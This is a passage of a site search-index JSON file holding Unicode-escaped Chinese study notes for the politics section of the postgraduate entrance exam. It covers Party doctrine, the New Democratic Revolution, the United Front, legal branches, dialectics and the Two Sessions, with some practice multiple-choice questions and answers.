\u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u548c\u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d 1.5. \u515a\u5916\u4eba\u58eb\u5ea7\u8c08\u4f1a 1.6. \u4e2d\u56fd\u68a6 1.7. \u6539\u9769\u3001\u7a33\u5b9a\u548c\u53d1\u5c55\u4e09\u8005\u7684\u5173\u7cfb 2. \u7b2c\u4e8c\u5468 2.1. \u515a\u7684\u653f\u6cbb\u8def\u7ebf 2.2. \u515a\u7684\u7fa4\u4f17\u8def\u7ebf 2.3. \u9769\u547d\u65b0\u9053\u8def 2.4. \u515a\u7684\u57fa\u672c\u8def\u7ebf 2.5. \u96c6\u4e2d\u529b\u91cf\u529e\u5927\u4e8b 2.6. \u4eba\u6c11\u662f\u5386\u53f2\u7684\u521b\u9020\u8005 2.7. \u6211\u56fd\u7684\u5b9e\u4f53\u6cd5\u5f8b\u90e8\u95e8 3. \u7b2c\u4e09\u5468 3.1. \u77db\u76fe\u7684\u540c\u4e00\u6027\u4e0e\u6597\u4e89\u6027 3.2. \u604b\u7231\u4e2d\u7684\u9053\u5fb7\u89c4\u8303 3.3. \u4e24\u4f1a\u5f00\u5e55 3.4. \u751f\u4ea7\u529b\u4e0e\u751f\u4ea7\u5173\u7cfb 3.5. \u4e24\u4f1a\u62a5\u544a 3.6. \u7406\u60f3\u4fe1\u5ff5\u662f\u7cbe\u795e\u4e4b\u201c\u9499\u201d 3.7. \u65b0\u4e8b\u7269\u4e0d\u53ef\u6218\u80dc\u7684\u539f\u56e0","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#1","text":"","title":"1. \u7b2c\u4e00\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#11","text":"\u5168\u9762\u5efa\u6210\u5c0f\u5eb7\u793e\u4f1a \u6218\u7565\u76ee\u6807\uff0c\u5b9e\u73b0\u4e2d\u56fd\u68a6\u7684\u5173\u952e\u4e00\u6b65 \u5168\u9762\u6df1\u5316\u6539\u9769 \u5173\u952e\u4e00\u62db \u5168\u9762\u4f9d\u6cd5\u6cbb\u56fd \u548c\u5168\u9762\u6df1\u5316\u6539\u9769\u5e76\u6210\u8f66\u4e4b\u4e24\u8f6e\uff0c\u9e1f\u4e4b\u4e24\u7ffc \u5168\u9762\u4ece\u4e25\u6cbb\u515a \u5176\u4ed6\u4e09\u4e2a\u5168\u9762\u7684\u4fdd\u8bc1","title":"1.1. \u56db\u4e2a\u5168\u9762\u7684\u5173\u7cfb"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#12","text":"\u3010\u5355\u9009\u3011\u201c\u897f\u8fc1\u7cbe\u795e\u201c\u662f\u57281956\u5e74\u4ea4\u901a\u5927\u5b66\u7531\u4e0a\u6d77\u8fc1\u5f80\u897f\u5b89\u7684\u8fc7\u7a0b\u4e2d\uff0c\u751f\u53d1\u51fa\u6765\u7684\u4e00\u79cd\u5b9d\u8d35\u7684\u7cbe\u795e\u8d22\u5bcc\u30022020\u5e74\u670822\u65e5\uff0c\u4e60\u8fd1\u5e73\u603b\u4e66\u8bb0\u8385\u4e34\u897f\u5b89\u4ea4\u901a\u5927\u5b66\u89c6\u5bdf\uff0c\u770b\u671b\u897f\u8fc1\u8001\u6559\u6388\u4ee3\u8868\uff0c\u53c2\u89c2\u897f\u8fc1\u535a\u7269\u9986\uff0c\u542c\u53d6\u897f\u8fc1\u5386\u53f2\u3001\u897f\u8fc1\u4ee5\u6765\u7684\u53d1\u5c55\u60c5\u51b5\u6c47\u62a5\u3002\u4e60\u8fd1\u5e73\u603b\u4e66\u8bb0\u5728\u8003\u5bdf\u65f6\u6307\u51fa\uff0c\u897f\u8fc1\u7cbe\u795e\u201c\u7684\u6838\u5fc3\u662f A.\u7231\u56fd\u4e3b\u4e49 B.\u80f8\u6000\u5927\u5c40\uff0c\u65e0\u79c1\u5949\u732e C.\u5f18\u626c\u4f20\u7edf\uff0c\u8270\u82e6\u521b\u4e1a D.\u542c\u515a\u6307\u6325\u8ddf\u515a\u8d70 \u7b54\u6848 $$ A $$ \u89e3\u6790 2005\u5e7412\u67086\u65e5\uff0c\u7ecf\u897f\u5b89\u4ea4\u5927\u515a\u59d4\u4f1a\u8bae\u5ba1\u8bae\u6279\u51c6\uff0c\u4ea4\u5927\u897f\u8fc1\u7cbe\u795e\u6982\u62ec\u4e3a\u201c\u80f8\u6000\u5927\u5c40\uff0c\u65e0\u79c1\u5949\u732e\uff0c\u5f18\u626c\u4f20\u7edf\uff0c\u8270\u82e6\u521b\u4e1a\u201c16\u4e2a\u5b57\u30022020\u5e744\u670822\u65e5\uff0c\u4e60\u8fd1\u5e73\u603b\u4e66\u8bb0\u5728\u897f\u5b89\u4ea4\u901a\u5927\u5b66\u8003\u5bdf\u65f6\u6307\u51fa:\u201c\u897f\u8fc1\u7cbe\u795e\u201c\u7684\u6838\u5fc3\u662f \u7231\u56fd\u4e3b\u4e49 \uff0c\u7cbe\u9ad3\u662f\u542c\u515a\u6307\u6325\u8ddf\u515a\u8d70\uff0c\u4e0e\u515a\u548c\u56fd\u5bb6\u3001\u4e0e\u6c11\u65cf\u548c\u4eba\u6c11\u540c\u547c\u5438\u3001\u5171\u547d\u8fd0\uff0c\u5177\u6709\u6df1\u523b\u73b0\u5b9e\u610f\u4e49\u548c\u5386\u53f2\u610f\u4e49\u3002","title":"1.2. \u897f\u8fc1\u7cbe\u795e"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#13","text":"\u52b3\u52a8\u8005\u8054\u76df \u4ee5\u5de5\u519c\u8054\u76df\u4e3a\u4e3b\u4f53\u7684\u5de5\u4eba\u9636\u7ea7\u540c\u519c\u6c11\u3001\u5c0f\u8d44\u4ea7\u9636\u7ea7\u7b49\u5176\u4ed6\u52b3\u52a8\u4eba\u6c11\u7684\u8054\u76df \u975e\u52b3\u52a8\u8005\u8054\u76df \u6c11\u65cf\u8d44\u4ea7\u9636\u7ea7\u7684\u8054\u76df \u6709\u65f6\u8ddf\u5927\u5730\u4e3b\u5927\u8d44\u4ea7\u9636\u7ea7\u7684\u8054\u76df \u3010\u5355\u9009\u3011\u4e2d\u56fd\u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u65f6\u671f\u7684\u7edf\u4e00\u6218\u7ebf\u5305\u542b\u7740\u4e24\u4e2a\u8054\u76df\u3002\u5176\u4e2d\u57fa\u672c\u7684\u3001\u4e3b\u8981\u7684 \u8054\u76df\u662f A.\u5de5\u4eba\u9636\u7ea7\u540c\u57ce\u5e02\u5c0f\u8d44\u4ea7\u9636\u7ea7\u7684\u8054\u76df B.\u4ee5\u5de5\u519c\u8054\u76df\u4e3a\u4e3b\u4f53\u7684\u5de5\u4eba\u9636\u7ea7\u540c\u519c\u6c11\u3001\u5c0f\u8d44\u4ea7\u9636\u7ea7\u7b49\u5176\u4ed6\u52b3\u52a8\u4eba\u6c11\u7684\u8054\u76df C.\u4ee5\u5de5\u519c\u8054\u76df\u4e3a\u4e3b\u4f53\u7684\u5de5\u4eba\u9636\u7ea7\u540c\u519c\u6c11\u3001\u5c0f\u8d44\u4ea7\u9636\u7ea7\u548c\u6c11\u65cf\u8d44\u4ea7\u9636\u7ea7\u7684\u8054\u76df D.\u5de5\u4eba\u9636\u7ea7\u540c\u53ef\u4ee5\u5408\u4f5c\u7684\u975e\u52b3\u52a8\u4eba\u6c11\u7684\u8054\u76df \u7b54\u6848 $$ B $$","title":"1.3. \u7edf\u4e00\u6218\u7ebf\u7684\u4e24\u4e2a\u8054\u76df"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#14","text":"\u65f6\u95f4\u70b9 \uff1a 1840\u9e26\u7247\u6218\u4e89\u540e-1918 \u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d 1919\u4e94\u56db\u8fd0\u52a8\u540e-1956\u5e74 \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d \u4e0d\u540c\u70b9 \uff1a \u9886\u5bfc\u529b\u91cf\u4e0d\u540c \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u7531\u65e0\u4ea7\u9636\u7ea7\u9886\u5bfc \u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u7531\u519c\u6c11\u9636\u7ea7\u3001\u8d44\u4ea7\u9636\u7ea7\u6539\u826f\u6d3e\u3001\u8d44\u4ea7\u9636\u7ea7\u9769\u547d\u6d3e\u9886\u5bfc \u6307\u5bfc\u601d\u60f3\u4e0d\u540c \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u6307\u5bfc\u601d\u60f3\u662f\u9a6c\u5217\u4e3b\u4e49 \u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u6307\u5bfc\u601d\u60f3 \u592a\u5e73\u5929\u56fd\u8fd0\u52a8\u2014\u2014\u300a\u4e09\u539f\u300b \u6d0b\u52a1\u8fd0\u52a8\u2014\u2014\u201c \u5e08\u5937\u5236\u5937\u201d \u3001\u201c \u4e2d\u4f53\u897f\u7528\u201d \u4e49\u548c\u56e2\u8fd0\u52a8\u2014\u2014\"\u6276\u6e05\u706d\u6d0b\" \u620a\u620c\u53d8\u6cd5\u2014\u2014\u8d44\u4ea7\u9636\u7ea7\u7ef4\u65b0\u601d\u60f3 \u8f9b\u4ea5\u9769\u547d\u2014\u2014\"\u4e09\u6c11\u4e3b\u4e49\" \u9769\u547d\u524d\u9014\u4e0d\u540c \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u7684\u76ee\u6807\u662f\u5b9e\u73b0\u793e\u4f1a\u4e3b\u4e49 \u65f6\u4ee3\u80cc\u666f\u4e0d\u540c \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u53d1\u751f\u5728\u5341\u6708\u9769\u547d\u4ee5\u540e\u3002\u4fc4\u56fd\u5341\u6708\u9769\u547d\u7684\u80dc\u5229\uff0c\u6807\u5fd7\u7740\u4eba\u7c7b\u5386\u53f2\u5f00\u59cb\u4e86\u7531\u8d44\u672c\u4e3b\u4e49\u5411\u793e\u4f1a\u4e3b\u4e49\u8f6c\u53d8\u7684\u8fdb\u7a0b\u3002 \u76f8\u540c\u70b9 \uff1a \u9769\u547d\u4efb\u52a1\u76f8\u540c \u53cd\u5e1d\u53cd\u5c01\u5efa \u9769\u547d\u5bf9\u8c61\u76f8\u540c \u5e1d\u56fd\u4e3b\u4e49\u548c\u5c01\u5efa\u4e3b\u4e49 \u9769\u547d\u6027\u8d28\u76f8\u540c \u8d44\u4ea7\u9636\u7ea7\u6027\u8d28\u7684\u6c11\u4e3b\u9769\u547d \u4e3a\u4ec0\u4e48\u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u662f\u65e0\u4ea7\u9636\u7ea7\u9886\u5bfc\u7684\u8d44\u4ea7\u9636\u7ea7\u9769\u547d\uff1f \u9996\u5148\uff0c\u4e2d\u56fd\u6b64\u65f6\u5904\u4e8e\u534a\u6b96\u6c11\u5730\u534a\u5c01\u5efa\u793e\u4f1a\uff0c\u9769\u547d\u4efb\u52a1\u4f9d\u65e7\u662f\u53cd\u5e1d\u53cd\u5c01\uff0c\u56e0\u6b64\uff0c\u51b3\u5b9a\u4e86\u8fd9\u4e2a\u65f6\u671f\u9769\u547d\u7684\u6027\u8d28\uff0c\u5c5e\u4e8e\u8d44\u4ea7\u9636\u7ea7\u6c11\u4e3b\u9769\u547d\uff0c\u7b80\u79f0\u6c11\u4e3b\u9769\u547d\u3002\u5176\u6b21\uff0c\u9769\u547d\u6027\u8d28\u4e0d\u662f\u7531\u9769\u547d\u9886\u5bfc\u9636\u5c42\u51b3\u5b9a\u7684\uff0c\u662f\u7531\u5176\u9769\u547d\u4efb\u52a1\u51b3\u5b9a\u7684\uff0c\u8fd9\u4e00\u70b9\u5fc5\u987b\u660e\u786e\u3002 \u56e0\u4e3a\u6309\u7167\u9a6c\u5217\u7684\u7406\u8bba\uff0c\u5efa\u7acb\u65e0\u4ea7\u9636\u7ea7\u653f\u6743\u7684\u987a\u5e8f\u4f9d\u6b21\u662f\u63a8\u7ffb\u5974\u96b6\u793e\u4f1a \\to \u63a8\u7ffb\u5c01\u5efa\u793e\u4f1a \\to \u63a8\u7ffb\u8d44\u672c\u4e3b\u4e49\u793e\u4f1a \\to \u5efa\u7acb\u65e0\u4ea7\u9636\u7ea7\u4e13\u653f\uff0c\u800c\u4e0d\u662f\u4ece\u53cd\u5c01\u76f4\u63a5\u8df3\u5230\u5efa\u7acb\u65e0\u4ea7\u9636\u7ea7\u9769\u547d\uff0c\u8fd9\u5176\u4e2d\u8d44\u4ea7\u9636\u7ea7\u9769\u547d\u662f\u4e0d\u53ef\u7701\u7565\u7684\u8fc7\u7a0b\u3002","title":"1.4. \u65b0\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d\u548c\u65e7\u6c11\u4e3b\u4e3b\u4e49\u9769\u547d"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#15","text":"","title":"1.5. \u515a\u5916\u4eba\u58eb\u5ea7\u8c08\u4f1a"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#16","text":"","title":"1.6. \u4e2d\u56fd\u68a6"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#17","text":"","title":"1.7. \u6539\u9769\u3001\u7a33\u5b9a\u548c\u53d1\u5c55\u4e09\u8005\u7684\u5173\u7cfb"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#2","text":"","title":"2. \u7b2c\u4e8c\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#21","text":"","title":"2.1. \u515a\u7684\u653f\u6cbb\u8def\u7ebf"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#22","text":"","title":"2.2. \u515a\u7684\u7fa4\u4f17\u8def\u7ebf"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#23","text":"","title":"2.3. \u9769\u547d\u65b0\u9053\u8def"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#24","text":"","title":"2.4. \u515a\u7684\u57fa\u672c\u8def\u7ebf"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#25","text":"","title":"2.5. \u96c6\u4e2d\u529b\u91cf\u529e\u5927\u4e8b"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#26","text":"","title":"2.6. \u4eba\u6c11\u662f\u5386\u53f2\u7684\u521b\u9020\u8005"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#27","text":"\u516d\u4e2a\u5b9e\u4f53\u6cd5\u90e8\u95e8 \uff1a \u5baa\u6cd5\u76f8\u5173\u6cd5 \u6c11\u6cd5\u5546\u6cd5 \u7ecf\u6d4e\u6cd5 \u793e\u4f1a\u6cd5 \u884c\u653f\u6cd5 \u5211\u6cd5 \u6839\u672c\u5927\u6cd5 \uff1a\u5baa\u6cd5 \u5211\u6cd5\u7684\u4e09\u5927\u57fa\u672c\u539f\u5219 \uff1a \u5211\u6cd5\u6cd5\u5b9a \u6cd5\u5f8b\u9762\u524d\u4eba\u4eba\u5e73\u7b49 \u7f6a\u5211\u76f8\u9002\u5e94","title":"2.7. \u6211\u56fd\u7684\u5b9e\u4f53\u6cd5\u5f8b\u90e8\u95e8"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#3","text":"","title":"3. \u7b2c\u4e09\u5468"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#31","text":"\u77db\u76fe\u5177\u6709\u540c\u4e00\u6027\u548c\u6597\u4e89\u6027 \u3010\u5206\u6790\u9898\u3011 \u5206\u6790\u81ea\u7136\u754c\u4e2d\u7684\u201c\u4e00\u7269\u964d\u4e00\u7269\u201d\u5e73\u8861\u6cd5\u5219\u6240\u4f53\u73b0\u7684\u552f\u7269\u8fa9\u8bc1\u6cd5\u539f\u7406\u3002 \u7b54\u6848 \u8054\u7cfb\u7684\u89c2\u70b9\u662f\u552f\u7269\u8fa9\u8bc1\u6cd5\u7684\u603b\u89c2\u70b9\u548c\u603b\u7279\u5f81\u4e4b\u4e00\uff0c\u4e16\u754c\u4e0a\u6ca1\u6709\u5b64\u7acb\u5b58\u5728\u7684\u4e8b\u7269\uff0c\u6bcf\u4e00\u79cd\u4e8b\u7269(\u5982\u53f6\u8717\u3001\u6355\u98df\u86f9\uff0c\u6c34\u82b1\u751f\u3001\u6c34\u82b1\u751f\u53f6\u7532\u7b49)\u90fd\u5904\u4e8e\u4e92\u8054\u7cfb\u4e4b\u4e2d\u3002 **\u5bf9\u7acb\u7edf\u4e00\u89c4\u5f8b\u662f\u552f\u7269\u8fa9\u8bc1\u6cd5\u7684\u5b9e\u8d28\u548c\u6838\u5fc3\uff0c\u5b83\u63ed\u793a\u4e86\u4e8b\u7269\u4e4b\u95f4\u8054\u7684\u6839\u672c\u5185\u5bb9\u548c\u5185\u5728\u53d1\u5c55\u52a8\u529b**\u3002\u81ea\u7136\u754c\u7684\u751f\u7269\u4e4b\u95f4(\u5982\u53f6\u86fe\u548c\u6355\u98df\u8702\u3001\u6c34\u82b1\u548c\u6c34\u82b1\u751f\u53f6\u7532\u7b49)\u5b58\u5728\u7740\u65e2\u76f8\u5bf9\u7acb\u53c8\u76f8\u7edf\u4e00\u7684\u5173\u7cfb\uff0c\u77db\u76fe\u7684\u540c\u4e00\u6027\u548c\u6597\u4e89\u6027\u4e92\u8054\u7ed3\u3001\u76f8\u8f85\u76f8\u6210\uff0c\u6784\u6210\u4e8b\u7269\u7684\u77db\u76fe\u8fd0\u52a8\uff0c\u63a8\u52a8\u4e86\u4e8b\u7269\u7684\u53d1\u5c55\u3002 **\u751f\u7269\u4e4b\u95f4\u201c\u4e00\u7269\u964d\u4e00\u7269\u201d\u73b0\u8c61\u4f53\u73b0\u4e86\u77db\u76fe\u53cc\u65b9\u76f8\u4e92\u4f9d\u8d56\u548c\u76f8\u4e92\u6597\u4e89\u7684\u5173\u7cfb**\uff0c\u201c\u4e00\u7269\u964d\u7269\u201d\u7684\u5e73\u8861\u6cd5\u5219\u662f\u77db\u76fe\u53cc\u65b9\u76f8\u4e92\u8054\u7cfb\u3001\u76f8\u4e92\u4f5c\u7528\u7684\u7ed3\u679c\u3002\u5bf9\u7acb\u7edf\u4e00\u89c4\u5f8b\u4f9b\u4e86\u4eba\u4eec\u8ba4\u8bc6\u4e16\u754c\u548c\u6539\u9020\u4e16\u754c\u7684\u6839\u672c\u65b9\u6cd5\u3002","title":"3.1. \u77db\u76fe\u7684\u540c\u4e00\u6027\u4e0e\u6597\u4e89\u6027"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#32","text":"\u5c0a\u91cd\u4eba\u683c\u5e73\u7b49 \u81ea\u89c9\u627f\u62c5\u8d23\u4efb \u6587\u660e\u76f8\u4eb2\u76f8\u7231","title":"3.2. \u604b\u7231\u4e2d\u7684\u9053\u5fb7\u89c4\u8303"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%80%83%E7%A0%94%E6%94%BF%E6%B2%BB%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9/2.%E6%AF%8F%E6%97%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AC%AC%E4%BA%8C%E5%AD%A3/#33","text":"\u4e24\u4f1a\u662f\u5bf9\u81ea1959\u5e74\u4ee5\u6765\u5386\u5e74\u53ec\u5f00\u7684 \u4e2d\u534e\u4eba\u6c11\u5171\u548c\u56fd\u5168\u56fd\u4eba\u6c11\u4ee3\u8868\u5927\u4f1a \u548c \u4e2d\u56fd\u4eba\u6c11\u653f\u6cbb\u534f\u5546\u4f1a\u8bae \u7684\u7edf\u79f0\u3002 \u7531\u4e8e\u4e24\u573a\u4f1a\u8bae\u4f1a\u671f\u57fa\u672c\u91cd\u5408\uff0c\u800c\u4e14\u5bf9\u4e8e\u56fd\u5bb6\u8fd0\u4f5c\u7684\u91cd\u8981\u7a0b\u5ea6\u90fd\u975e\u5e38\u7684\u9ad8\uff0c\u6545\u7b80\u79f0\u505a\u201c\u4e24\u4f1a\u201d\u3002\u4ece\u7701\u7ea7\u5730\u65b9\u5230\u4e2d\u592e\uff0c\u5404\u5730\u7684\u653f\u534f\u53ca\u4eba\u5927\u7684\u5168\u4f53\u4f1a\u8bae\u7684\u4f1a\u671f\u5168\u90e8\u57fa\u672c\u91cd\u5408\uff0c\u6240\u4ee5\u4e24\u4f1a\u7684\u540d\u79f0\u53ef\u4ee5\u540c\u65f6\u9002\u7528\u4e8e\u5168\u56fd\u53ca\u5404\u7701\uff08\u5e02\u3001\u81ea\u6cbb\u533a\uff09\u3002 \u4e24\u4f1a\u6bcf5\u5e74\u79f0\u4e3a\u4e00\u5c4a\uff0c\u6bcf\u5e74\u4f1a\u8bae\u79f0X\u5c4aX\u6b21\u4f1a\u8bae\u3002\u6839\u636e\u4e2d\u56fd\u5baa\u6cd5\u89c4\u5b9a\uff1a\u201c\u4e24\u4f1a\u201d\u53ec\u5f00\u7684\u610f\u4e49\u5728\u4e8e\u5c06\u201c\u4e24\u4f1a\u201d\u4ee3\u8868\u4ece\u4eba\u6c11\u4e2d\u5f97\u6765\u7684\u4fe1\u606f\u548c\u8981\u6c42\u8fdb\u884c\u6536\u96c6\u53ca\u6574\u7406\uff0c\u4f20\u8fbe\u7ed9\u515a\u4e2d\u592e\u3002\u201c\u4e24\u4f1a\u201d\u4ee3\u8868\u662f\u4ee3\u8868\u7740\u5e7f\u5927\u9009\u6c11\u7684\u4e00\u79cd\u5229\u76ca\u7684\uff0c\u4ee3\u8868\u7740\u9009\u6c11\u5728\u53ec\u5f00\u4e24\u4f1a\u671f\u95f4\uff0c\u5411\u653f\u5e9c\u6709\u5173\u90e8\u95e8\u63d0\u51fa\u9009\u6c11\u4eec\u81ea\u5df1\u7684\u610f\u89c1\u548c\u8981\u6c42\u3002\u5730\u65b9\u6bcf\u5e74\u53ec\u5f00\u7684\u4eba\u5927\u548c\u653f\u534f\u4e5f\u79f0\u4e3a\u4e24\u4f1a\uff0c\u901a\u5e38\u53ec\u5f00\u7684\u65f6\u95f4\u6bd4\u5168\u56fd\u201c\u4e24\u4f1a\u201d\u65f6\u95f4\u8981\u65e9\u3002 \u5341\u4e09\u5c4a\u5168\u56fd\u4eba\u5927\u4e09\u6b21\u4f1a\u8bae\u4e8e2020\u5e745\u670822\u65e5\u5728\u5317\u4eac\u53ec\u5f00\uff0c\u5168\u56fd\u653f\u534f\u5341\u4e09\u5c4a\u4e09\u6b21\u4f1a\u8bae\u4e8e5\u670821\u65e5\u53ec\u5f00\u3002","title":"3.3. 